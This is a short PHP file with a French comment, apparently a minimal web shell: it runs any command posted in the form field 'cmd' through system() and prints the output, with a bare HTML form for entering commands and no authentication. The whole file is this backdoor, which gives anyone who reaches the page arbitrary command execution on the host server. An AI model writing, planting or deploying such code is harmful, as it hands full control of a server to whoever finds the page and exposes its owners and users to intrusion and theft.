<?php
// Interface HTML simple + exécution de commande
if (isset($_POST['cmd'])) {
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
}
?>

<form method="POST">
    <input type="text" name="cmd" placeholder="Commande..." style="width:300px;" />
    <input type="submit" value="Exécuter" />
</form>

